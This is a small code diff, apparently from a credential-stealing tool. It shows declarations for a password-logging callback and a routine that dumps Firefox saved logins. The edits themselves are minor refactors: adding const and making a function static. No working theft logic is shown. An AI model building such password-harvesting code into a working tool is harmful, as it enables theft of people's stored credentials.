@@ -19,7 +19,7 @@
 // callback for the password
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
 extern char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt);
-extern char *HM_CompletePath(char *file_name, char *buffer);
+extern char *HM_CompletePath(const char *file_name, char *buffer);
 extern WCHAR *GetTBLibPath(WCHAR *, size_t);
 extern char H4_DUMMY_NAME[];
 extern char *GetDosAsciiName(WCHAR *orig_path);
@@ -669,7 +669,7 @@ int DumpFF(WCHAR *profilePath, WCHAR *signonFile)
 	return 1;
 }
 
-int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
+static int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
 {
 	struct ffp_entry ffentry;
 	
